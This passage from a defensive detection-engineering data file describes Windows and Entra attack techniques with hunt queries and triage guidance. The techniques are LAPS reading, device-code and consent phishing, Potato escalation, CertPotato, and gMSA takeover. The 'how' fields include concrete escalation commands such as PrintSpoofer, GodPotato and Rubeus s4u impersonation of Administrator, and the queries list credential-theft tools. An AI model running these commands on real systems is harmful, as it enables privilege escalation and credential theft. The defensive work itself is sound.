10) by AccountUpn, IPAddress, bin(Timestamp, 1h)\n| sort by count_ desc"}],"huntcs":[{"plat":"Event Search","t":"msLAPS-Password/EncryptedPassword read or Get-LapsADPassword/pyLAPS exec=black / authorized IT retrieval=white","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*msLAPS-Password*\" OR CommandLine=\"*msLAPS-EncryptedPassword*\" OR CommandLine=\"*Get-LapsADPassword*\" OR CommandLine=\"*ms-Mcs-AdmPwd*\" OR CommandLine=\"*pyLAPS*\" OR CommandLine=\"*Get-AdmPwdPassword*\")\n| stats count by ComputerName, UserName, ParentBaseFileName, CommandLine"},{"plat":"Identity Protection","t":"4662 LAPS-attr LDAP read is DC-only; unexpected ReadLAPSPassword/DPAPI-NG decrypt via Identity Protection","q":"// Falcon Identity Protection detection: LAPS attribute (msLAPS-Password/msLAPS-EncryptedPassword) read by non-authorized principal + BloodHound ReadLAPSPassword reachability review"}]},{"name":"Entra Device Code Phishing","aka":"Device Code Flow abuse / microsoft.com/device phishing","phase":"trust","group":"Cloud / Hybrid (Entra)","mitre":"T1566, T1528","cve":"","sev":"High","summary":"Abuses Entra ID (Azure AD) OAuth 2.0 Device Authorization Grant, tricking a victim into entering a code at the legitimate microsoft.com/devicelogin to steal access/refresh tokens.","how":"The attacker starts the Device Code Flow to obtain a user_code and presents the legitimate Microsoft sign-in URL (microsoft.com/devicelogin) and code to the victim. When the victim approves with their own credentials + MFA, the attacker polls to obtain access/refresh tokens and thereafter accesses M365/Azure with them. Because the destination is a legitimate MS domain, it is convincing.","tools":"TokenTactics, AADInternals, roadtx, o365-attack-toolkit","detect":"In Entra sign-in logs, monitor for anomalous device code authentications (protocol=deviceCode), token issuance from unexpected devices/locations, and approval of the same user_code within a short window. Leverage Identity Protection risk detections.","events":"Entra Sign-in logs(Device Code), Identity Protection リスク","mitigate":"Restrict device code flow with Conditional Access (only required users/locations), and apply phishing-resistant MFA (FIDO2) and token protection. User education and risk-based sign-in blocking.","triage":"In Entra Sign-in logs, filter for authenticationProtocol=deviceCode sign-ins and check for token issuance shortly after user_code approval from an issuing IP/User-Agent/unmanaged device diverging from the user's usual device/location. It is black when phishing-email receipt, approval, and token issuance from a different location chain on the same user_code with Identity Protection Unfamiliar sign-in / Anomalous token firing concurrently. Users/apps that legitimately use Device Code Flow (CI/CD, Azure CLI, IoT) from known hosts on expected networks with a clear business purpose are white.","hunt":[{"plat":"Entra","t":"Successful risky sign-in from a country the user rarely uses = black / normal sign-in from usual country = white","q":"let baseline = AADSignInEventsBeta\n| where Timestamp between (ago(30d) .. ago(1d))\n| summarize KnownCountries = make_set(Country) by AccountUpn;\nAADSignInEventsBeta\n| where Timestamp > ago(1d)\n| where ErrorCode == 0\n| where RiskLevelDuringSignIn in (\"high\", \"medium\")\n| join kind=leftouter baseline on AccountUpn\n| where isnotempty(Country) and Country !in (KnownCountries)\n| project Timestamp, AccountUpn, Application, IPAddress, Country, City, ClientAppUsed, RiskLevelDuringSignIn, ConditionalAccessStatus\n| sort by Timestamp desc"},{"plat":"Entra","t":"Same user issued tokens from multiple countries within a short window = black (victim approves, attacker redeems) / single-location sign-ins = white","q":"SigninLogs\n| where TimeGenerated > ago(1d)\n| where ResultType == 0\n| extend Country = tostring(Location.countryOrRegion)\n| where isnotempty(Country)\n| summarize Countries = make_set(Country), IPs = make_set(IPAddress), Apps = make_set(AppDisplayName), n = count()\n    by UserPrincipalName, bin(TimeGenerated, 1h)\n| where array_length(Countries) >= 2\n| sort by TimeGenerated desc"}],"huntcs":[{"plat":"Identity Protection","t":"Device Code token issuance from unexpected device/location is an Entra-side event; caught by Identity Protection, not a fabricated EDR query.","q":"// Falcon EDR does not record Entra Sign-in logs (protocol=deviceCode) or user_code approval.\n// Use Falcon Identity Protection detection: \"Anomalous authentication\" / \"Device code flow\" risk,\n// correlated with Entra ID Protection risky sign-in (unfamiliar location / impossible travel, short-lived same user_code).\n// For a hunt query, pivot to the attacker host that INITIATES the device-code flow (next query)."},{"plat":"LogScale","t":"Attacker host running TokenTactics/AADInternals/roadtx to start a device-code flow = suspicious; routine Azure module ops = benign.","q":"#event_simpleName=ProcessRollup2\n| FileName=/^(powershell|pwsh|python|python3)\\.exe$/i\n| CommandLine=/TokenTactics|Invoke-DeviceCodeFlow|Get-AzureToken|DeviceCode|AADInternals|Get-AADIntAccessTokenFor|roadtx|devicecode/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName], function=count(as=hits))\n| sort(hits, order=desc)"}]},{"name":"Entra OAuth Consent Phishing (Illicit Grant)","aka":"Consent phishing / Illicit Consent Grant","phase":"trust","group":"Cloud / Hybrid (Entra)","mitre":"T1550.001, T1528","cve":"","sev":"High","summary":"Tricks a victim into approving consent (OAuth consent) to a malicious Entra app registration, obtaining delegated permissions to Graph API etc. (Mail.Read/Files.ReadWrite, etc.) for persistent data access without password/MFA.","how":"The attacker registers a multi-tenant app and lures the victim to the legitimate Microsoft consent screen. When the victim consents, a refresh token is issued in that user's scope, allowing the app to access Mail/Files thereafter. It works in tenants where user consent is allowed and is not revoked by password change or MFA (consent revocation is required).","tools":"365-Stealer, GraphRunner, o365-attack-toolkit","detect":"In Entra audit logs, monitor for new service principals / OAuth consent grants (Consent to application), grants of high-risk delegated permissions, and consent to unverified apps. Correlate anomalous Graph access.","events":"Entra Audit(Consent to application / Add delegated permission grant=oauth2PermissionGrant〔委任〕 / Add app role assignment〔アプリ権限の場合〕), Defender for Cloud Apps アラート","mitigate":"Restrict user consent to an admin-approval workflow (admin consent required) and block apps from unverified publishers. Periodically inventory existing consents/OAuth grants and revoke suspicious apps. Deploy app governance (Defender for Cloud Apps).","triage":"In Entra Audit logs, extract \"Consent to application\" and \"Add app role assignment to service principal\" plus new service principal/app registrations, and check the consented app for unverified publisher, multi-tenancy, and requested scopes (high-risk delegated perms like Mail.Read/Files.Read.All/offline_access). It is black when, right after a lure, user consent, new SP creation, and that SP's bulk Graph access to mail/files (Defender for Cloud Apps alert) chain together and access persists after password change/MFA. A known SaaS onboarding that is IT-approved, publisher-verified, via an admin-consent workflow with scopes proportionate to purpose is white.","hunt":[{"plat":"Entra","t":"Regular user consents to an app / grants delegated permission with risky scopes = black / admin approving a verified app = white","q":"AuditLogs\n| where TimeGenerated > ago(1d)\n| where OperationName has \"Consent to application\" or OperationName has \"Add delegated permission grant\" or OperationName has \"Add app role assignment to service principal\"\n| where tostring(Result) =~ \"success\"\n| extend Actor = tostring(InitiatedBy.user.userPrincipalName)\n| extend TargetApp = tostring(TargetResources[0].displayName)\n| extend Scopes = tostring(TargetResources[0].modifiedProperties)\n| project TimeGenerated, OperationName, Actor, TargetApp, Scopes\n| sort by TimeGenerated desc"},{"plat":"Entra","t":"Consent event granting high-privilege scopes (Mail.Read/Mail.Send/offline_access) to an unverified app = black / low-risk read-only consent = white","q":"CloudAppEvents\n| where Timestamp > ago(1d)\n| where ActionType == \"Consent to application\" or ActivityType has \"Consent\"\n| extend Perms = tostring(RawEventData.ModifiedProperties)\n| where Perms has_any (\"Mail.Read\", \"Mail.Send\", \"Mail.ReadWrite\", \"offline_access\", \"Files.ReadWrite.All\", \"Directory.Read.All\")\n| project Timestamp, AccountDisplayName, IPAddress, CountryCode, ObjectName, ActivityType, Perms\n| sort by Timestamp desc"}],"huntcs":[{"plat":"Identity Protection","t":"OAuth consent grant / new service principal is an Entra Audit event; use Identity Protection / MDCA, not a fabricated EDR query.","q":"// Falcon EDR does not record Entra Audit logs (\"Consent to application\", \"Add app role assignment\", new servicePrincipal).\n// Use Falcon Identity Protection / Defender for Cloud Apps detection: \"Illicit consent grant\" /\n// \"Risky OAuth app\" / unverified-publisher consent to high-privilege delegated Graph scopes (Mail.Read, offline_access).\n// For an endpoint hunt, pivot to the attacker host driving the consent/registration tooling (next query)."},{"plat":"LogScale","t":"Consent-phishing tooling (GraphRunner/365-Stealer) or DNS to adminconsent endpoints = suspicious; normal Graph usage = benign.","q":"#event_simpleName=ProcessRollup2\n| FileName=/^(powershell|pwsh|python|python3|node)\\.exe$/i\n| CommandLine=/GraphRunner|365-Stealer|Invoke-Inject|New-MgServicePrincipal|adminconsent|oauth2\\/authorize|Add-MgOauth2PermissionGrant|Consent-to-application/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName], function=count(as=hits))\n| sort(hits, order=desc)"}]},{"name":"Potato Family LPE (SeImpersonate Abuse)","aka":"PrintSpoofer, RoguePotato, JuicyPotato, GodPotato, SweetPotato, EfsPotato, DCOMPotato","phase":"privesc","group":"ホスト/ローカル","mitre":"T1134.001, T1134.002","cve":"","sev":"High","summary":"A family of local privilege-escalation (LPE) exploits in which a service account holding SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege (IIS AppPool, MSSQL, NETWORK/LOCAL SERVICE, etc.) coerces a SYSTEM-level process into NTLM-authenticating to an attacker-controlled local RPC/DCOM/named-pipe endpoint, then steals/duplicates that token to become SYSTEM — the go-to way to turn a limited web/DB foothold into full host compromise.","how":"Prerequisite: an interactive shell (web shell, xp_cmdshell, deserialization, etc.) running in a context that holds SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege. By default these are held by IIS w3wp.exe (AppPool identity), sqlservr.exe, NT AUTHORITY\\NETWORK SERVICE / LOCAL SERVICE, and most service accounts — confirm with `whoami /priv`. Core primitive = authentication coercion + token impersonation: force a SYSTEM process to NTLM-authenticate to an attacker-controlled local endpoint (a named pipe, or DCOM/RPC via a fake OXID resolver), then duplicate the returned SYSTEM token with SeImpersonate and launch an arbitrary process as SYSTEM via CreateProcessWithTokenW / CreateProcessAsUser (= T1134.001 token impersonation/theft → T1134.002 create process with the token). Variants: PrintSpoofer coerces via the Print Spooler RPC (\\pipe\\spoolss, RpcRemoteFindFirstPrinterChangeNotificationEx). RoguePotato revives JuicyPotato on Win10 1809+/2019 using a fake OXID resolver on port 135 (needs a redirector, e.g. socat forwarding 127.0.0.1:135 → attacker:9999). JuicyPotato abuses BITS/specific-CLSID DCOM (broken by default since 1809). EfsPotato/SharpEfsPotato abuse MS-EFSR (\\pipe\\lsarpc / efsrpc). GodPotato uses a fake OXID inside RPCSS to cover Server 2012–2022 broadly. DCOMPotato targets specific DCOM services with default auth level; PrintNotifyPotato abuses the PrintNotify service. Typical runs: `PrintSpoofer.exe -i -c cmd`, `GodPotato.exe -cmd \"cmd /c whoami\"`, `RoguePotato.exe -r <redirIP> -e \"cmd.exe\" -l 9999`, `SharpEfsPotato.exe`.","tools":"PrintSpoofer, RoguePotato, JuicyPotato, JuicyPotatoNG, GodPotato, SweetPotato, EfsPotato / SharpEfsPotato, DCOMPotato, PrintNotifyPotato, socat (port-135 redirector)","detect":"The strongest signal is a privilege inversion in process lineage: a service account (w3wp.exe / sqlservr.exe / AppPool identity / NETWORK/LOCAL SERVICE) as the parent, with a child process (cmd.exe / powershell.exe / whoami.exe, etc.) running as NT AUTHORITY\\SYSTEM — event 4688. The coercion produces a local NTLM logon (4624 Type 3, source = loopback/same host, auth package NTLM). If \"Audit Sensitive Privilege Use\" is enabled, 4673 for SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege. Named-pipe creation (Sysmon 17/18: \\spoolss, \\lsarpc, \\efsrpc, \\epmapper, or random pipes). RoguePotato yields a connection to local 127.0.0.1:135 from a non-RPCSS process (Sysmon 3). In MDE, DeviceEvents ProcessPrimaryTokenModified / SensitiveApiCall (incl. OpenProcessApiCall) and DeviceProcessEvents privilege-inverted lineage are effective. Telemetry: Windows Security auditing, Sysmon (1/3/17/18), MDE Device* tables, EDR process ancestry.","events":"4688(親=w3wp/sqlservr等サービスアカウント→子=SYSTEM), 4624(Type3/NTLM/ループバック認証), 4673(SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege 機密特権使用/要監査有効), Sysmon 17/18(名前付きパイプ \\spoolss/\\lsarpc/\\efsrpc), Sysmon 3(127.0.0.1:135 RoguePotato)","mitigate":"The root fix is stripping unnecessary SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege and enforcing least privilege. Keep IIS AppPools on the default ApplicationPoolIdentity rather than elevating them; run service accounts as gMSA with minimal logon rights. Close the upstream web/DB flaws (RCE, deserialization, upload) that grant the interactive shell in the first place. Stop the Print Spooler service on servers that don't need it (especially DCs/member servers) to kill PrintSpoofer/PrintNotifyPotato. Restrict outbound 135/tcp and arbitrary redirector traffic at the host boundary to blunt RoguePotato. Apply WDAC/AppLocker and AV (most Potato binaries are signatured). Enable \"Audit Sensitive Privilege Use\" and process-creation auditing with command line, and build a SIEM correlation for the service-account→SYSTEM privilege inversion. Keep OS patched (JuicyPotato's default path is dead on 1809+).","triage":"Malicious (black): On the web/DB server host's Security log, a 4688 whose parent is a low-privilege service (w3wp.exe under an AppPool identity, sqlservr.exe, etc.) and whose child is cmd.exe/powershell.exe/whoami.exe running as NT AUTHORITY\\SYSTEM = Potato LPE. Confidence rises if a 4624 Type 3 (NTLM, source = loopback/self) on the same host just beforehand correlates as the coerced auth. With sensitive-privilege auditing on, a 4673 (SeImpersonate) by an AppPool/service identity immediately followed by SYSTEM process creation is also black. For RoguePotato, same-host Sysmon 3 shows a non-RPCSS process connecting to 127.0.0.1:135. Benign (white): a SYSTEM child whose parent is services.exe / svchost.exe / wininit.exe = legitimate service start. SCCM/ccmexec.exe, patch deployment, or backup agents spawning cmd/PowerShell as SYSTEM = known management path. Admin PsExec has parent PSEXESVC.exe and, tied to a known admin host/account, is white. 4673 arising during normal SQL/backup service operation is white. The decision axes: \"is the parent a user/network-facing low-priv service, or a legitimate system service?\" and \"does the lineage match known admin tooling?\"","hunt":[{"plat":"MDE","t":"Service-account parent spawning SYSTEM child (privilege inversion)","q":"DeviceProcessEvents\n| where Timestamp > ago(14d)\n| where InitiatingProcessAccountName in~ (\"network service\",\"local service\") or InitiatingProcessFileName in~ (\"w3wp.exe\",\"sqlservr.exe\",\"httpd.exe\",\"tomcat9.exe\",\"php-cgi.exe\",\"java.exe\")\n| where AccountName =~ \"system\"\n| where FileName in~ (\"cmd.exe\",\"powershell.exe\",\"pwsh.exe\",\"whoami.exe\",\"net.exe\",\"net1.exe\",\"rundll32.exe\")\n| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessAccountName, FileName, ProcessCommandLine, AccountName\n| order by Timestamp desc"},{"plat":"MDE","t":"Potato tool artifacts (filename/command line)","q":"DeviceProcessEvents\n| where Timestamp > ago(30d)\n| where ProcessCommandLine has_any (\"PrintSpoofer\",\"RoguePotato\",\"JuicyPotato\",\"JuicyPotatoNG\",\"GodPotato\",\"SweetPotato\",\"EfsPotato\",\"SharpEfsPotato\",\"DCOMPotato\",\"PrintNotifyPotato\") or FileName has_any (\"PrintSpoofer\",\"Potato\",\"EfsPotato\")\n| project Timestamp, DeviceName, AccountName, InitiatingProcessAccountName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, SHA256\n| order by Timestamp desc"},{"plat":"MDE","t":"RoguePotato: non-RPCSS process connecting to loopback 135","q":"DeviceNetworkEvents\n| where Timestamp > ago(14d)\n| where RemoteIP in (\"127.0.0.1\",\"::1\") and RemotePort == 135\n| where InitiatingProcessFileName !in~ (\"svchost.exe\",\"services.exe\")\n| summarize Hits=count(), Procs=make_set(InitiatingProcessFileName), Cmds=make_set(InitiatingProcessCommandLine) by DeviceName, bin(Timestamp,1h)\n| order by Hits desc"}],"huntcs":[{"plat":"Event Search","t":"Service parent → SYSTEM/high-integrity child process","q":"event_simpleName IN (ProcessRollup2,SyntheticProcessRollup2) (ParentBaseFileName IN (w3wp.exe,sqlservr.exe,httpd.exe,tomcat9.exe,php-cgi.exe,java.exe)) (FileName IN (cmd.exe,powershell.exe,whoami.exe,net.exe,net1.exe,rundll32.exe))\n| search UserName=\"*SYSTEM*\" OR IntegrityLevel=16384\n| stats count as n values(CommandLine) as cmds values(UserName) as users by aid, ComputerName, ParentBaseFileName, FileName\n| sort - n"},{"plat":"Event Search","t":"Potato tool name/command-line detection","q":"event_simpleName IN (ProcessRollup2,SyntheticProcessRollup2)\n| search CommandLine IN (*PrintSpoofer*,*RoguePotato*,*JuicyPotato*,*GodPotato*,*SweetPotato*,*EfsPotato*,*DCOMPotato*,*PrintNotifyPotato*) OR FileName IN (*Potato*,PrintSpoofer.exe,GodPotato.exe)\n| stats count as n by aid, ComputerName, UserName, ParentBaseFileName, FileName, CommandLine, SHA256HashData\n| sort - n"}]},{"name":"CertPotato (Virtual/Service Account ADCS Escalation)","aka":"CertPotato, virtual account S4U, NT SERVICE, ADIDNS","phase":"privesc","group":"ADCS 証明書サービス","mitre":"T1649, T1134.001","cve":"","sev":"High","summary":"CertPotato abuses the fact that Windows virtual/service accounts (NETWORK SERVICE, LOCAL SERVICE, NT SERVICE\\, IIS APPPOOL\\) authenticate on the network as the computer account (MACHINE$): the attacker enrolls a machine certificate from AD CS, uses PKINIT to obtain the machine's TGT, then S4U2self to impersonate a local Administrator to the host's own SPN, escalating from a service account to SYSTEM-equivalent.","how":"Prerequisites: code execution as a virtual/service account on a domain-joined host (e.g. IIS APPPOOL\\ via a web shell, NETWORK SERVICE via MSSQL, any NT SERVICE\\ service), plus an Enterprise CA publishing the default Machine/Computer template (Domain Computers have enroll rights). The account is low-privileged locally, but the key primitive is that these virtual accounts present the host's machine-account credentials for network authentication. Steps: (1) From the service-account context, request a machine certificate from the CA over ICertPassage (MS-ICPR) RPC — authentication is transparently performed as MACHINE$, so it issues: Certify.exe request /ca:CA01\\corp-CA /template:Machine (Certipy on Linux). (2) Use the resulting PFX for a PKINIT TGT: Rubeus.exe asktgt /user:SRV01$ /certificate:cert.pfx /password:xxx /ptt (or PKINITtools gettgtpkinit.py). (3) With the machine TGT, run S4U2self to impersonate a privileged local user to the host's own SPN: Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:cifs/SRV01.corp.local,host/SRV01.corp.local /user:SRV01$ /ticket:tgt.kirbi /ptt (Impacket getST.py -self -impersonate Administrator). (4) Use the Administrator service ticket to access the local host as admin — effectively SYSTEM. Core primitive: virtual account = machine-account network identity, chained through certificate to PKINIT to S4U2self.","tools":"Certify, Rubeus, Certipy, PKINITtools (gettgtpkinit.py), Impacket getST.py, Mimikatz","detect":"Correlate CA 4886/4887 (cert request/issuance) showing a machine account obtaining a certificate with an immediately following PKINIT logon on the DC. A DC 4768 with PreAuthType=16 (certificate pre-auth) and populated Certificate Information fields for a machine account (ends with $) is highly anomalous, since machines normally do not use PKINIT. The subsequent 4769 where ServiceName is that same machine account and TargetUserName is a human privileged user (e.g. Administrator) is the S4U2self fingerprint. On the endpoint, look for Rubeus.exe / Certify.exe / Certipy spawned by virtual-account processes such as w3wp.exe or sqlservr.exe, and command lines containing asktgt/s4u/self/impersonateuser/certificate. Telemetry: AD CS security log, DC Kerberos auditing, MDE process/network events, MDI certificate-based authentication detections. The strongest signal is the cert-issuance to PKINIT to S4U chain occurring within minutes.","events":"4886/4887(CA: 証明書要求・発行, Requester=MACHINE$), 4768(DC: PKINIT/証明書ログオン, PreAuthType=16), 4769(DC: S4U2self, Service=MACHINE$→Target=Administrator), 4624(Type3 マシンアカウント), 4688(Rubeus/Certify/Certipy 実行)","mitigate":"Harden AD CS templates: unpublish unneeded Machine/Computer templates, restrict enroll rights to required hosts only, and enable CA auditing (4886/4887). Enforce strong certificate mapping per KB5014754 (StrongCertificateBindingEnforcement=2) and monitor PKINIT 4768. The real fix is upstream: eliminate the RCE on exploitable services (vulnerable web apps, etc.), run services under least-privilege gMSAs, and apply Tier-0 separation. S4U2self cannot be disabled (it is by-design Kerberos), so alert on machine-account PKINIT usage and on a machine requesting S4U for a human privileged user to its own SPN. Treat the CA as a Tier-0 asset with layer isolation.","triage":"Malicious (black): On CA (CA01) the security log shows 4887 issued to SRV01$ at a time unrelated to policy refresh, immediately followed on the DC (DC01) by 4768 for the same SRV01$, same source IP, PreAuthType=16, then 4769 on DC01 with ServiceName=SRV01$ / TargetUserName=Administrator (S4U2self). In parallel, endpoint SRV01 4688/DeviceProcessEvents shows Rubeus.exe/Certify.exe launched with a parent of w3wp.exe (IIS APPPOOL) or sqlservr.exe (NETWORK SERVICE). This \"cert-issued to machine PKINIT to self Administrator S4U\" correlation is black. Benign (white): machine certificate auto-enrollment emits 4886/4887 at gpupdate but is NOT followed by machine-account PKINIT 4768 or a human-privileged S4U 4769. Legitimate PKINIT 4768 comes from smartcard logons of human UPNs, not $-suffixed accounts. Constrained-delegation services also emit 4769 S4U, but from configured service accounts to expected services — not a machine impersonating Administrator to its own SPN.","hunt":[{"plat":"MDE","t":"Cert/Kerberos tooling run under a virtual/service account","q":"DeviceProcessEvents\n| where Timestamp > ago(14d)\n| where FileName in~ (\"rubeus.exe\",\"certify.exe\",\"certipy.exe\")\n   or ProcessCommandLine has_any (\"asktgt\",\"/certificate:\",\" s4u\",\"/self\",\"/impersonateuser\",\"gettgtpkinit\",\"req /ca\")\n| where InitiatingProcessAccountName has_any (\"network service\",\"local service\",\"iis apppool\") \n   or InitiatingProcessFileName in~ (\"w3wp.exe\",\"sqlservr.exe\",\"tomcat.exe\",\"httpd.exe\")\n   or AccountName endswith \"$\"\n| project Timestamp, DeviceName, AccountName, InitiatingProcessAccountName, InitiatingProcessFileName, FileName, ProcessCommandLine\n| order by Timestamp desc"},{"plat":"Sentinel","t":"Machine cert issuance chained to machine-account PKINIT","q":"let win = 1h;\nlet issued = SecurityEvent\n| where EventID == 4887 and SubjectUserName endswith \"$\"\n| extend Acct = tolower(trim_end(@\"\\$\", tostring(split(SubjectUserName,\"\\\\\")[-1])))\n| project IssueTime=TimeGenerated, CA=Computer, Acct;\nlet tgt = SecurityEvent\n| where EventID == 4768 and TargetUserName endswith \"$\"\n| extend Acct = tolower(trim_end(@\"\\$\", TargetUserName))\n| project TgtTime=TimeGenerated, DC=Computer, Acct, IpAddress;\nissued\n| join kind=inner tgt on Acct\n| where TgtTime between (IssueTime .. IssueTime + win)\n| project IssueTime, TgtTime, Acct, CA, DC, IpAddress\n| order by TgtTime asc"},{"plat":"Sentinel","t":"S4U2self: machine impersonating a human privileged user to its own SPN","q":"SecurityEvent\n| where TimeGenerated > ago(14d)\n| where EventID == 4769\n| where ServiceName endswith \"$\"                       // service SPN is the machine account itself\n| where TargetUserName != \"\" and TargetUserName != \"-\" and not(TargetUserName endswith \"$\")\n| summarize Impersonated=make_set(TargetUserName), tickets=count() by Computer, ServiceName, bin(TimeGenerated, 1h)\n| extend Privileged = Impersonated has_any (\"Administrator\",\"admin\",\"adm\")\n| order by Privileged desc, tickets desc"}],"huntcs":[{"plat":"Event Search","t":"Rubeus/Certify/Certipy run by a service/virtual account","q":"event_simpleName=ProcessRollup2 (FileName IN (Rubeus.exe, Certify.exe, Certipy.exe) OR CommandLine=*asktgt* OR CommandLine=*/certificate:* OR CommandLine=*/self* OR CommandLine=*/impersonateuser:*)\n| search (UserName=\"*NETWORK SERVICE*\" OR UserName=\"*LOCAL SERVICE*\" OR UserName=\"*IIS APPPOOL*\" OR UserName=\"*$\" OR ParentBaseFileName IN (w3wp.exe, sqlservr.exe, httpd.exe, tomcat.exe))\n| stats count as execs values(CommandLine) as cmds values(FileName) as tools by aid, ComputerName, UserName, ParentBaseFileName\n| sort - execs"},{"plat":"Identity Protection","t":"Certificate (PKINIT) machine auth then S4U escalation (DC-side signal)","q":"// Falcon EDR does NOT collect DC Kerberos/AD CS telemetry. Pivot to Falcon Identity Protection:\n// - detection: certificate-based (PKINIT) authentication for a COMPUTER account\n// - detection: 'Service account anomaly' / S4U2self privilege escalation to a privileged user\n// Correlate the IdP certificate-auth event for MACHINE$ with the attacker-host ProcessRollup2 (Rubeus asktgt/s4u) from huntcs[0] on the same ComputerName/aid."}]},{"name":"gMSA/dMSA Membership Takeover (msDS-GroupMSAMembership Write)","aka":"PrincipalsAllowedToRetrieveManagedPassword, WriteGMSAPassword edge, msDS-ManagedPassword","phase":"privesc","group":"ACL/オブジェクト権限","mitre":"T1098, T1555","cve":"","sev":"High","summary":"An ACL-abuse privilege escalation in which write access to a gMSA/dMSA's msDS-GroupMSAMembership (PrincipalsAllowedToRetrieveManagedPassword) lets an attacker add a principal they control, retrieve the managed password (msDS-ManagedPassword) over LDAP, derive its NT hash, and impersonate the frequently highly privileged service account.","how":"【Prerequisites】WriteProperty on the target gMSA's msDS-GroupMSAMembership attribute, or WriteDACL/WriteOwner/GenericAll/GenericWrite over the gMSA object (each lets the attacker rewrite that attribute's value or security descriptor). Enumerate reachability with BloodHound's WriteGMSAPassword edge.\n【Procedure】(1) Add an attacker-controlled computer/user to the allow list: `Set-ADServiceAccount svc_gmsa -PrincipalsAllowedToRetrieveManagedPassword attacker_host$`, or PowerView `Set-DomainObject -Identity svc_gmsa -Set @{'msds-groupmsamembership'=<SDDL bytes>}`. (2) As that principal, read the computed msDS-ManagedPassword over a sealed (sign&seal / LDAPS) LDAP connection and derive the NTLM hash from the current password in the MSDS-MANAGEDPASSWORD_BLOB (GMSAPasswordReader, gMSADumper.py, NetExec --gmsa, DSInternals ConvertFrom-ADManagedPasswordBlob). (3) Use the NT hash for Pass-the-Hash / OverPass-the-Hash (Rubeus, Impacket) to authenticate as the gMSA, which commonly runs privileged services (AD CS, SQL, delegation) — a direct escalation.\n【Key primitive】Adding a reader to a writable allow list makes an attacker principal a legitimate reader of a DC-generated password — no reset needed, and re-readable even after automatic rotation, making it stealthy.\n【dMSA/BadSuccessor variant】With CreateChild/Write on an OU, create a dMSA and set msDS-ManagedAccountPrecededByLink plus msDS-DelegatedMSAState to \"migrate\" a target account; the KDC then issues tickets carrying the target's PAC/keys, enabling impersonation without ever touching the target object (Windows Server 2025).","tools":"BloodHound (WriteGMSAPassword/ReadGMSAPassword edges), PowerView (Set-DomainObject), PowerShell ActiveDirectory module (Set/Get-ADServiceAccount), GMSAPasswordReader, gMSADumper.py, NetExec/CrackMapExec (--gmsa), DSInternals (ConvertFrom-ADManagedPasswordBlob), Impacket, Rubeus, SharpSuccessor/BadSuccessor PoC (dMSA)","detect":"(1) DC Directory Service Changes auditing (5136) showing the msDS-GroupMSAMembership attribute of a gMSA modified by a non-Tier-0 principal or from an unexpected host. (2) Read of the msDS-ManagedPassword property (4662, requires a read SACL on the attribute) from an unusual host/subject. (3) MDI LDAP-reconnaissance detection, the dMSA BadSuccessor alert, and LDAP queries targeting the managed password. (4) Kerberos: the gMSA account (name ending in $) requesting a TGT (4768) from a host other than its designated members, or a new source IP. (5) Endpoint: execution traces of GMSAPasswordReader/gMSADumper/NetExec or PowerShell using ConvertFrom-ADManagedPasswordBlob. Telemetry sources: DC Security event log (DS Changes/Kerberos), MDI (IdentityDirectoryEvents/IdentityQueryEvents), MDE endpoint process telemetry, LDAP.","events":"5136(msDS-GroupMSAMembership属性の変更), 4662(msDS-ManagedPassword読取; 要SACL), 4768(gMSAとしてTGT要求), 4624 Type3(gMSAでのネットワークログオン), 5137(dMSA BadSuccessorオブジェクト作成)","mitigate":"(1) Least privilege: inventory and remove excess Write/WriteDACL/WriteOwner/GenericAll on gMSA objects and their OU; restrict changes to msDS-GroupMSAMembership to Tier-0 only. (2) Regularly review PrincipalsAllowedToRetrieveManagedPassword and scope it to the exact service hosts. (3) Enable Directory Service Changes auditing and SACLs (audit reads of msDS-ManagedPassword and writes to msDS-GroupMSAMembership). (4) Place gMSAs in protected Tier-0 OUs and deny writes from lower tiers. (5) dMSA/BadSuccessor: restrict CreateChild for msDS-DelegatedManagedServiceAccount on OUs, monitor msDS-ManagedAccountPrecededByLink, and apply Microsoft's 2025 guidance/updates. (6) Enforce strict tiering and monitor gMSA usage baselines.","triage":"Black (malicious): On the DC Security log, 5136 shows the msDS-GroupMSAMembership of a gMSA modified where SubjectUserName is a workstation-tier / non-Tier-0 user (or an unexpected source) and the added value is an attacker-controlled SID. Within minutes the same principal/host reads msDS-ManagedPassword (4662, or an MDI LDAP query), then a TGT (4768) is issued for the gMSA (name ending $) from a host that is not a member, followed by 4624 Type3 to sensitive resources. The write→read→auth chain from a single non-Tier-0 host = black.\nWhite (benign): The same 5136 attribute change performed by a Tier-0 domain admin from a PAW during a documented change window, with the added principals being the intended member servers; subsequent gMSA 4768/4624 originate only from those designated hosts, with no password read from workstations. Routine `Install-ADServiceAccount`/`Test-ADServiceAccount` on a member host (LSASS legitimately retrieves the password at service start) producing 4768/4624 from the legitimate host = white.","hunt":[{"plat":"MDE","t":"gMSA password-read / membership-write tooling on endpoints","q":"DeviceProcessEvents\n| where Timestamp > ago(30d)\n| where ProcessCommandLine has_any (\n    \"msDS-ManagedPassword\",\"PrincipalsAllowedToRetrieveManagedPassword\",\n    \"ConvertFrom-ADManagedPasswordBlob\",\"Set-ADServiceAccount\",\n    \"GMSAPasswordReader\",\"gMSADumper\",\"--gmsa\",\"msDS-GroupMSAMembership\")\n| where InitiatingProcessFileName !in~ (\"mmc.exe\")\n| summarize Cmds=make_set(ProcessCommandLine, 8), Hits=count()\n    by DeviceName, AccountName, FileName, bin(Timestamp, 1h)\n| order by Hits desc"},{"plat":"MDI","t":"LDAP queries targeting managed-password / membership attributes","q":"IdentityQueryEvents\n| where Timestamp > ago(30d)\n| where Protocol == \"Ldap\"\n| where Query has_any (\"msDS-ManagedPassword\",\"msDS-GroupMSAMembership\")\n| summarize Queries=count(), Targets=make_set(QueryTarget, 20)\n    by AccountName, DeviceName, IPAddress\n| where Queries > 0\n| order by Queries desc"},{"plat":"Sentinel","t":"5136 membership change to gMSA objects by non-machine subject","q":"SecurityEvent\n| where TimeGenerated > ago(30d)\n| where EventID == 5136\n| where ObjectName has \"Managed Service Accounts\"   // default gMSA container; adjust for custom OUs\n| where SubjectUserName !endswith \"$\"                 // human-initiated change to a service-account object\n| summarize Changes=count(), 